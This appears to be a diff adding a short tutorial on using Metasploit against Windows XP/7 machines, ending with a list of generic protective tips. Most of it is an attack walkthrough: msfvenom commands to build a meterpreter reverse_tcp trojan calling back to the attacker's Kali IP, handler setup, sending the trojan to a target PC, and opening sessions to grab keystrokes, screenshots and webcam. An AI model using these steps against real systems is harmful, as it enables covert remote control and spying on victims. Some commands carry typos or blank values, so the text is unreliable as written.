@@ -1,0 +1,64 @@
+ Metasploit Tool:
+
+System Security by using metasploit Tool :
+
+1.patch to avoid these type of attacks
+            Hacker Machine : Kali Linux
+            Victim machine : Windows XP / Windows 7.
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+Steps to perform attack:
+1.Open Terminal in Kali Linux and create a Trojan by using below command
+
+( msfvenom ‐p windows/meterpreter/reverse_tcp LHOST=192.168.0.109
+ <IP address of Kali> LPORT=4444 ‐o /root/Desktop/sampletest.exe ).
+
+2.As you can see Trojan will be created in Desktop and as seen in screen shot
+   Now Open
+
+3.Now Open Metasploit Terminal and launch by typing msfconsle command
+
+
+4.Now launch the attack by entering below commands
+       
+      a- ( use exploit/multi/handler )
+      b-( set payload windows/meterpreter/reverse_tcp )
+      c-( set LHOST 192.168.  . )
+      d-( set LPORT 4444 )
+      e-( exploit ‐j ‐z )
+                                                  as shown in the pics attached
+
+5.Now send the Trojan file to target PC to test the system security and execute in     machine
+
+6.Now try to execute the file in target pc and you can see the attacker machine(kali)  
+   by reverse tcp payload its connected to hacker machine.
+
+7.To see the how many sessions established in hacker machine you can use below command
+                           (  sessions ‐l  )
+
+8.Now connect to windows7 machine by using below command
+                            (  sessions ‐i 1   )
+9.Now execute the commands to get the keystrokes / screenshots / Webcam and etc.
+
+10.Continue with the steps shown by the machine to complete the process.
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Vulnerability issue and security patch to avoid these type of attacks:
+
+These attacks can be done by anonimous links sent by someone,so never do the below things-
+1.Never click on Hyperlinks in Email
+2.Never enter sensitive data in a (Pop Up Window)
+3.Verify HTTPS on address bar
+4.Education on trojens, virus, malware
+5.Keep Antivirus Protection Current
+6.Utilize Anti Spam Software
+7.Utilize Anti Spy Software
+8.Install and maintain a reliable Firewall
+9.Protect against DNS pharming attacks
+10.Utilize Backup System copies
+11.scan the downloded files with multiple antivirus and then only open the file.
+12.clear logs from time to time
+13.seek for any anonimous task scheduled in task scheduler
+
+etc,
+ 
+
